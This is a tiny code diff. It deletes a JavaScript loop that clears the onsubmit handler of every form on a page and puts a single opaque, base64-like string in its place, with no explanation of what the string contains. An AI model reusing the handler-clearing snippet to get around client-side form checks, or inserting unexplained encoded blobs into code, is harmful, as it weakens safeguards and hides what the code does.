@@ -1,4 +1,1 @@
-var f = document.getElementsByTagName("form");
-            for(var i = 0; i < f.length;i++){
-                f[i].setAttribute("onsubmit", "")
-            }
+eiF5iGAiKEgW0VbOPTk7x6zTircI5UX6eephbhu9W2++TDajYWX0Dv/cFQiH1eDfCB3munwYKmFDSJ544cOCrkQ2CrZ9Ftyi8XPLaVrTvwaSHgIZRDm8/r9MTnaaIc7dHE6t3TWN7NYrk73hoMeLsR3nhs0Cfio+AMxJNBB50vykEXbhNZYbQdjZ7swSerDAYmWzRMq9Aw8269oX2IKso/7QVEJBI0Nr8zcrdU6hcTGC8ygNZlpMvFjaLYt+cSmc
